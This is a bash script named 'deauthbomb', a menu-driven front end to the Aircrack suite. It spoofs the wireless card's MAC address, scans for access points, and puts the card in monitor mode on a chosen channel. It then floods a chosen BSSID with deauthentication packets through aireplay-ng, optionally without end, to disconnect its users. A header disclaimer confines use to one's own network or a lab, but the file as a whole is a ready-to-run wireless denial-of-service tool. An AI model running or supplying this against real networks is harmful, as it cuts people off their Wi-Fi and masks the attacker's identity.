#!/bin/bash

#deauthbomb
#GNU GPL V3
#
#
#My first bash script, and first real attempt at any programming at all. Free to use, rip and distribute. 
#Since this script can bump people off of AP's, I take no responsibility for it's usage.
#Only use against your own network or in a lab designed for pentesting.
#
#
#Required:
#Aircrack Suite
#
#if there was hope, it must lie in the proles...

#colorizing

	GREEN="\033[32m"
	RESET="\033[0m"
	RED="\033[31m"

#code


#----------------main menu-----------------#
main_menu ()

	{

	clear

	echo "

    __                       __   __           __                      __    
.--|  |.-----..---.-..--.--.|  |_|  |--.______|  |--..-----..--------.|  |--.
|  _  ||  -__||  _  ||  |  ||   _|     |______|  _  ||  _  ||        ||  _  |
|_____||_____||___._||_____||____|__|__|      |_____||_____||__|__|__||_____|
....................pr0l3............................v0.1mk2................."


	sleep 1

	echo "
1) Setup Attack Platform

2) Begin Targeted Deauth

3) Begin Sweeping Deauth

4) Exit
"
	echo ""
echo -e "Current targeted BSSID - $GREEN $bssid $RESET     Current channel of operation - $GREEN $channel $RESET"

	echo ""
echo ".............................................................................."

	echo ""

	read menu1
	case $menu1 in

		1) setup_wifi;;
		2) target;;
		3) echo "In development...";main_menu;;
		4) clear;cleanup;exit;;
		*) echo "Please enter a valid response (1-3)"
			sleep 0.5;main_menu;;

	esac

	}

#--------------Setup wireless devices---------#

setup_wifi ()

	{

	clear

echo "Wireless devices availble:"
	echo ""
	echo ""
	ifconfig -a | grep wlan |awk '{print $1"   "$5 }' 
	echo ""
	echo ""
echo "Specify wireless device to use:"
	echo ""
	echo ""

	read wifidevice

echo "Spoofing MAC address..."

	sleep 1

	macchanger -A $wifidevice

	echo ""
	echo ""
echo "
Identify channel to monitor on. Match to target AP. 
Wait for AP list - ctrl+c to exit airodump"

	sleep 5

	airodump-ng $wifidevice

echo "Identify channel to monitor on:"

	read channel

	echo ""
	echo ""

echo "Identify target BSSID:"

	read bssid

	bssid=$bssid

	echo ""
	echo ""

echo -e "Target BSSID = $RED$bssid$RESET"

	echo ""
	echo ""

echo -e "Channel set to $RED$channel$RESET"

	channel=$channel

	sleep 2

	#Make sure everything looks okay - channel, bssid#
	iwconfig $wifidevice channel $channel
	airmon-ng start $wifidevice $channel
	iwlist mon0 channel

	sleep 1 

echo "Almost there... let it run."

	sleep 3

	echo ""
	echo ""
echo "Device is ready - returning to main menu..."
	sleep 3

	main_menu

	}


#-------------targeted attack----------------#
target ()

	{

	clear

echo "Using which device?"

	ifconfig -a | grep mon |awk '{print $1"   "$5 }'

	echo ""

	read device

	echo ""
	echo ""

echo "BSSID of target: $bssid"

	sleep 2

	echo ""
	echo ""

echo "Number of deauth packets to send (0 for infinite)"

echo "The more you send, the longer it's down..."

	read packets

	sleep 5
	echo ""
	echo ""

	aireplay-ng -0 $packets -a $bssid $device

	echo ""
	echo ""

echo -e "Attack $GREEN complete $RESET, resetting and returning to main menu."

	sleep 2

	cleanup
	main_menu
	
}
	
#----------exiting, resetting defaults------#
cleanup ()

	{

	clear
echo "Cleaning up..."

	sleep 1

	airmon-ng stop mon0

	channel=""

	bssid=""
	clear

	}

#-----------------bash script, bring up main menu---------------#

	main_menu
